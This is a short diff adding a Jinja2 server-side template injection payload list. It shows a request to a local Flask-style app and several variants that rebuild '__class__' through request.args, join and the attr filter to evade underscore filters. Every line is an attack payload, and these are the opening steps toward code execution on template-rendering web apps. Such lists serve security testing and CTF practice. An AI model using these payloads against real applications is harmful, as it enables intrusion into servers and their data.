@@ -1,0 +1,6 @@
+http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
